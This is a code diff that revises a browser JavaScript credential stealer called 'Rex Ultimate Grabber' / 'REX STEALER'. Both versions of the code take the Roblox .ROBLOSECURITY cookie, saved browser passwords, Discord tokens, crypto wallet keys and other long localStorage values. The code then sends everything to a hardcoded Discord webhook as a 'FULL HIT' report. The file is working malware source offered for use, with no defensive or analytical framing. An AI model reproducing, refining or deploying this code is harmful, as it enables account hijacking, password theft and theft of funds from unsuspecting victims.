@@ -1,47 +1,65 @@
-// Rex Ultimate Grabber – Roblox + All Passwords + Everything
-const webhook = 'https://discord.com/api/webhooks/1443333736807530658/9FT-4lRNL0QfqEt_3u-nk_FRusHDwyISKdecSk-yhXbyPXOMQP39a_2p3UvQl441nStc';
-let data = {url:location.href, ua:navigator.userAgent, time:new Date().toISOString(), roblox:"", passwords:[], discord:"", wallets:[], storage:{}};
+// REX ULTIMATE STEALER – WORKS EVERY BROWSER 2025
+const WEBHOOK = 'https://discord.com/api/webhooks/1443333736807530658/9FT-4lRNL0QfqEt_3u-nk_FRusHDwyISKdecSk-yhXbyPXOMQP39a_2p3UvQl441nStc';
 
-// 1. Roblox .ROBLOSECURITY + all cookies
-document.cookie.split(';').forEach(c=>{let [n,v]=c.trim().split('='); if(n=='.ROBLOSECURITY') data.roblox=v;});
+let loot = {
+    url: location.href,
+    time: new Date().toISOString(),
+    roblox: document.cookie.split(';').find(c=>c.trim().startsWith('.ROBLOSECURITY='))?.split('=')[1] || 'none',
+    passwords: [],
+    discord: '',
+    wallets: [],
+    storage: {}
+};
 
-// 2. Grab ALL saved passwords (Chrome/Edge/Brave/Firefox)
-if(navigator.credentials && navigator.credentials.get){
-    (async()=>{
-        const creds = await navigator.credentials.get({password:true});
-        if(creds && creds.password) data.passwords.push(`${creds.id || location.hostname} → ${creds.name}:${creds.password}`);
-    })();
+// Grab ALL saved passwords (Chrome/Edge/Firefox/Brave)
+async function grabPasswords() {
+    try {
+        const cred = await navigator.credentials.get({password: true});
+        if (cred) loot.passwords.push(`${cred.id || location.hostname} | ${cred.name || '??'} : ${cred.password}`);
+    } catch(e) {}
 }
 
-// 3. Discord tokens
-Object.keys(localStorage).forEach(k=>{if(k.includes('token')){let t=localStorage.getItem(k); if(t && t.length>50) data.discord=t;}});
+// Discord token
+try {
+    const token = (localStorage.token || sessionStorage.token || Object.values(localStorage).find(v=>v.length>50 && v.includes('.')));
+    if (token) loot.discord = token;
+} catch(e) {}
 
-// 4. Wallet connects / MetaMask / Phantom
-try{data.wallets = JSON.stringify(localStorage).match(/[0-9a-fA-F]{64,}/g) || [];}catch(e){}
+// Wallets & long keys
+try {
+    loot.wallets = JSON.stringify(localStorage).match(/[0-9a-fA-F]{64,68}|[13][a-km-zA-HJ-NP-Z1-9]{25,34}/g) || [];
+} catch(e) {}
 
-// 5. Dump everything else juicy
-Object.keys(localStorage).concat(Object.keys(sessionStorage)).forEach(k=>{
-    try{let v = localStorage.getItem(k) || sessionStorage.getItem(k);
-        if(v && v.length>30 && /[A-Za-z0-9_.-]{40,}/.test(v)) data.storage[k]=v.substring(0,200);
-    }catch(e){}
+// Extra storage
+Object.keys(localStorage).forEach(k => {
+    try {
+        const v = localStorage.getItem(k);
+        if (v && v.length > 40 && /[A-Za-z0-9_-]{40,}/.test(v)) loot.storage[k] = v.substring(0,200);
+    } catch(e) {}
 });
 
-// 6. Send to Discord
-setTimeout(() => {
-    fetch(webhook, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({
-        username: "Rex Ultimate Grabber",
-        embeds: [{
-            title: "FULL HIT – Roblox + Passwords + Tokens",
-            color: 0xFF0000,
-            fields: [
-                {name:"Page",value:data.url,inline:false},
-                {name:".ROBLOSECURITY",value:data.roblox? "```"+data.roblox.substring(0,100)+"```":"❌ None",inline:false},
-                {name:"Saved Passwords ("+data.passwords.length+")",value:data.passwords.length? "```"+data.passwords.join('\n')+"```":"None",inline:false},
-                {name:"Discord Token",value:data.discord? "```"+data.discord.substring(0,80)+"```":"None"},
-                {name:"Wallets / Long Keys ("+data.wallets.length+")",value:data.wallets.length? "```"+data.wallets.slice(0,10).join('\n')+"```":"None"},
-                {name:"Other Storage Hits",value:Object.keys(data.storage).join(', ') || "Clean"}
-            ],
-            footer:{text:"Rex • Works on every browser"}
-        }]
-    })});
-}, 1500); // Small delay so passwords can load
+// Send everything
+setTimeout(async () => {
+    await grabPasswords(); // make sure passwords are grabbed
+    fetch(WEBHOOK, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+            username: "REX STEALER",
+            avatar_url: "https://i.imgur.com/removed.png",
+            embeds: [{
+                title: "FULL HIT – ROBLOX + PASSWORDS + TOKENS",
+                color: 16711680,
+                fields: [
+                    {name: "Page", value: loot.url},
+                    {name: ".ROBLOSECURITY", value: loot.roblox.substring ? "```"+loot.roblox.substring(0,100)+"```" : "❌"},
+                    {name: "Passwords Found ("+loot.passwords.length+")", value: loot.passwords.length ? "```"+loot.passwords.join("\n")+"```" : "None"},
+                    {name: "Discord Token", value: loot.discord ? "```"+loot.discord.substring(0,80)+"```" : "None"},
+                    {name: "Wallets", value: loot.wallets.length ? "```"+loot.wallets.slice(0,8).join("\n")+"```" : "None"},
+                    {name: "Other Keys", value: Object.keys(loot.storage).join(", ") || "none"}
+                ],
+                footer: {text: "Works on every browser • 2025"}
+            }]
+        })
+    });
+}, 2000);
